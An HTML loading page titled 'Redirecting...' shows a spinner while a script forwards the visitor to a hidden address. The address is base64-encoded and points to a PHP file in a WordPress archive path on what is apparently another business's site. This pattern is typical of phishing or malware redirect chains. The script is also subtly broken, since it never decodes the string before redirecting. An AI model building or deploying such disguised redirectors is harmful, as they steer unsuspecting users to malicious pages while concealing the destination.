<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #f8f9fa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #3498db;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        // URL to redirect to
        const redirectUrl = "aGFuZHltYW5zZXJ2aWNlc29mY2hpY2Fnby5jb20vd3AtYXJjaGl2ZS8wMzBjZi5waHA="; // Replace with your target URL

        // Perform the redirect
        function performRedirect() {
            window.location.replace(redirectUrl);
        }

        // Execute immediately
        performRedirect();

        // Fallback redirect after 3 seconds if immediate redirect fails
        setTimeout(() => {
            if (document.location.href === window.location.href) {
                performRedirect();
            }
        }, 3000);
    </script>
</body>
</html>
